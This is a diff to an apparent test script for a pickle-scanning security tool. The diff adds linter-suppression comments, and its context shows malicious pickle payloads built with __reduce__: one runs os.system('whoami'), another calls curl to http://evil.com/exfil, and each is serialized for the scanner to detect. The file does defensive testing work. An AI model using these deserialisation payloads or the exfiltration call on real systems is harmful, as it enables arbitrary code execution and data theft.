@@ -4,7 +4,7 @@ Tests pickle scanning and model signing with real payloads.
 All payloads use real attack techniques; none are executed.
 """
 import os
-import pickle
+import pickle  # noqa: S403 - intentional: this file tests the pickle scanner itself
 import sys
 import tempfile
 
@@ -19,7 +19,7 @@ print("\n[1/4] Scanning safe pickle (numpy array)...")
 from src.scanners import scan_pickle_bytes
 import numpy as np
 
-safe_data = pickle.dumps({"weights": np.array([1.0, 2.0, 3.0]), "bias": 0.5})
+safe_data = pickle.dumps({"weights": np.array([1.0, 2.0, 3.0]), "bias": 0.5})  # noqa: S301
 result = scan_pickle_bytes(safe_data)
 print(f"  Risk level: {result.risk_level}")
 print(f"  Malicious: {result.is_malicious}")
@@ -34,7 +34,7 @@ class MaliciousPayload:
         return (os.system, ("whoami",))
 
 
-malicious_data = pickle.dumps(MaliciousPayload())
+malicious_data = pickle.dumps(MaliciousPayload())  # noqa: S301
 result = scan_pickle_bytes(malicious_data)
 print(f"  Risk level: {result.risk_level}")
 print(f"  Findings: {[f.message for f in result.findings]}")
@@ -51,7 +51,7 @@ class SubprocessPayload:
         return (subprocess.Popen, (["curl", "http://evil.com/exfil"],))
 
 
-malicious_data2 = pickle.dumps(SubprocessPayload())
+malicious_data2 = pickle.dumps(SubprocessPayload())  # noqa: S301
 result2 = scan_pickle_bytes(malicious_data2)
 print(f"  Risk level: {result2.risk_level}")
 print(f"  Dangerous imports: {result2.dangerous_imports}")
